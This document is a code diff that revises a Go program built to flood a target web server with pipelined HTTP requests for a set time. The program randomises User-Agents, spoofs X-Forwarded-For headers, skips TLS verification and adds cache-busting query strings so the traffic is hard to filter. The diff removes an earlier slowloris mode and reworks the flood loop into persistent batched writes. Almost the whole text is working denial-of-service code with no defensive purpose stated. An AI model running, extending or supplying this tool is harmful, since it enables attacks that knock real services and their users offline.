@@ -1,6 +1,7 @@
 package main
 
 import (
+    "bytes"
     "crypto/tls"
     "fmt"
     "math/rand"
@@ -8,21 +9,22 @@ import (
     "net/url"
     "os"
     "strconv"
+    "strings"
     "sync"
     "time"
 )
 
 var (
-    ip            string
-    ips           []string
-    port          int
-    path          string
-    threads       int
-    timer         int
-    customHost    string
-    httpMethods   = []string{"GET", "HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"} // Expanded HTTP methods
-    slowlorisRate = 0.4 // float64 type
+    ip      string
+    ips     []string
+    port    int
+    path    string
+    threads int
+    timer   int
+    host    string
 )
+
+var httpMethods = []string{"GET", "HEAD", "POST"}
 
 func init() {
     rand.Seed(time.Now().UnixNano())
@@ -35,12 +37,12 @@ func resolveDNS(hostname string) {
         os.Exit(1)
     }
     for _, addr := range addrs {
-        if ipv4 := addr.To4(); ipv4 != nil { // Only IPv4 addresses
+        if ipv4 := addr.To4(); ipv4 != nil {
             ips = append(ips, ipv4.String())
         }
     }
     if len(ips) == 0 {
-        fmt.Println("No IPv4 addresses resolved")
+        fmt.Println("No IPs resolved")
         os.Exit(1)
     }
 }
@@ -77,16 +79,15 @@ func randomUserAgent() string {
         model = deviceType.models[rand.Intn(len(deviceType.models))] + "; "
     }
 
-    var osKeys []string
+    var osKeys, browserKeys []string
     for k := range osInfo {
         osKeys = append(osKeys, k)
     }
-    selectedOS := osKeys[rand.Intn(len(osKeys))]
-
-    var browserKeys []string
     for k := range browserVersions {
         browserKeys = append(browserKeys, k)
     }
+
+    selectedOS := osKeys[rand.Intn(len(osKeys))]
     selectedBrowser := browserKeys[rand.Intn(len(browserKeys))]
 
     return fmt.Sprintf("Mozilla/5.0 (%s%s%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s",
@@ -103,33 +104,20 @@ func randomUserAgent() string {
     )
 }
 
-func buildRequest(method, path string) []byte {
-    host := customHost
-    if host == "" {
-        host = ip
-    }
-
+func buildRequest(method, reqPath string) []byte {
     headers := []string{
         fmt.Sprintf("Host: %s", host),
         fmt.Sprintf("User-Agent: %s", randomUserAgent()),
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         "Accept-Language: en-US,en;q=0.5",
         "Accept-Encoding: gzip, deflate, br",
-        "Accept-Charset: utf-8,ISO-8859-1;q=0.5",
         fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
-        fmt.Sprintf("Referer: http://%s/%d", ip, rand.Intn(100)),
-        "X-Requested-With: XMLHttpRequest",
         "Connection: keep-alive",
         "Cache-Control: no-cache",
     }
 
-    if method == "POST" || method == "PUT" || method == "PATCH" {
-        // Larger POST/PUT/PATCH payload (1KB)
-        payloadSize := 1024
-        payload := make([]byte, payloadSize)
-        rand.Read(payload)
-        data := fmt.Sprintf("payload=%x", payload)
-
+    if method == "POST" {
+        data := fmt.Sprintf("data=%d", rand.Intn(1000000))
         headers = append(headers,
             "Content-Type: application/x-www-form-urlencoded",
             fmt.Sprintf("Content-Length: %d", len(data)),
@@ -138,29 +126,25 @@ func buildRequest(method, path string) []byte {
             headers[i], headers[j] = headers[j], headers[i]
         })
         return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n%s",
-            method, path, joinHeaders(headers), data))
+            method, reqPath, strings.Join(headers, "\r\n"), data))
     }
 
     rand.Shuffle(len(headers), func(i, j int) {
         headers[i], headers[j] = headers[j], headers[i]
     })
     return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n",
-        method, path, joinHeaders(headers)))
+        method, reqPath, strings.Join(headers, "\r\n")))
 }
 
-func joinHeaders(headers []string) string {
-    var result string
-    for _, h := range headers {
-        result += h + "\r\n"
-    }
-    return result
-}
+func floodWorker(id int, stop <-chan struct{}, wg *sync.WaitGroup) {
+    defer wg.Done()
 
-func floodWorker(id int, stop <-chan struct{}) {
     tlsConfig := &tls.Config{
         InsecureSkipVerify: true,
-        ServerName:         ip,
+        ServerName:         ip, // Correct SNI
     }
+
+    const batchSize = 10
 
     for {
         select {
@@ -168,64 +152,38 @@ func floodWorker(id int, stop <-chan struct{}) {
             return
         default:
             target := fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
+
             conn, err := createConnection(target, tlsConfig)
             if err != nil {
                 continue
             }
 
-            // Generate pipelined requests
-            numRequests := rand.Intn(100) + 200 // 200-300 requests per connection
-            var reqs []byte
-            for i := 0; i < numRequests; i++ {
-                method := httpMethods[rand.Intn(len(httpMethods))]
-                reqPath := path
-                if rand.Intn(2) == 0 {
-                    reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1000000))
-                }
-                reqs = append(reqs, buildRequest(method, reqPath)...)
-            }
-
-            // Send all requests in one write
-            conn.Write(reqs)
-            conn.Close()
-        }
-    }
-}
-
-func slowlorisWorker(id int, stop <-chan struct{}) {
-    tlsConfig := &tls.Config{InsecureSkipVerify: true}
-
-    for {
-        select {
-        case <-stop:
-            return
-        default:
-            target := fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
-            conn, err := createConnection(target, tlsConfig)
-            if err != nil {
-                continue
-            }
-
-            partial := fmt.Sprintf("GET %s?slow=%d HTTP/1.1\r\nHost: %s\r\n", 
-                path, rand.Intn(10000), ip)
-            conn.Write([]byte(partial))
-
-            // Send headers indefinitely until stop
-            ticker := time.NewTicker(5 * time.Second)
-            done := make(chan bool)
-            go func() {
-                <-stop
-                done <- true
-            }()
-        loop:
             for {
                 select {
-                case <-done:
-                    ticker.Stop()
+                case <-stop:
                     conn.Close()
-                    break loop
-                case <-ticker.C:
-                    conn.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Intn(100))))
+                    return
+                default:
+                    var batch [][]byte
+                    for i := 0; i < batchSize; i++ {
+                        method := httpMethods[rand.Intn(len(httpMethods))]
+                        reqPath := path
+                        if rand.Intn(2) == 0 {
+                            reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1000000))
+                        }
+                        batch = append(batch, buildRequest(method, reqPath))
+                    }
+
+                    var fullBatch bytes.Buffer
+                    for _, req := range batch {
+                        fullBatch.Write(req)
+                    }
+
+                    _, err := conn.Write(fullBatch.Bytes())
+                    if err != nil {
+                        conn.Close()
+                        break
+                    }
                 }
             }
         }
@@ -233,10 +191,15 @@ func slowlorisWorker(id int, stop <-chan struct{}) {
 }
 
 func createConnection(target string, tlsConfig *tls.Config) (net.Conn, error) {
-    if port == 443 {
-        return tls.Dial("tcp", target, tlsConfig)
+    conn, err := net.Dial("tcp", target)
+    if err != nil {
+        return nil, err
     }
-    return net.Dial("tcp", target)
+
+    if port == 443 {
+        return tls.Client(conn, tlsConfig), nil
+    }
+    return conn, nil
 }
 
 func main() {
@@ -260,37 +223,29 @@ func main() {
             port = 80
         }
     }
-    path = u.Path
+    path = u.EscapedPath()
     if path == "" {
         path = "/"
+    }
+    host = ip
+    if len(os.Args) > 4 {
+        host = os.Args[4]
     }
 
     threads, _ = strconv.Atoi(os.Args[2])
     timer, _ = strconv.Atoi(os.Args[3])
-    if len(os.Args) > 4 {
-        customHost = os.Args[4]
-    }
 
     resolveDNS(ip)
-    fmt.Printf("Target: %s:%d (%d IPv4 addresses)\n", ip, port, len(ips))
+    fmt.Printf("Target: %s:%d (%d IPs)\n", ip, port, len(ips))
 
     stop := make(chan struct{})
     var wg sync.WaitGroup
 
-    // Start workers
     for i := 0; i < threads; i++ {
         wg.Add(1)
-        go func(id int) {
-            defer wg.Done()
-            if rand.Float64() < slowlorisRate {
-                slowlorisWorker(id, stop)
-            } else {
-                floodWorker(id, stop)
-            }
-        }(i)
+        go floodWorker(i, stop, &wg)
     }
 
-    // Run for specified duration
     time.Sleep(time.Duration(timer) * time.Second)
     close(stop)
     wg.Wait()
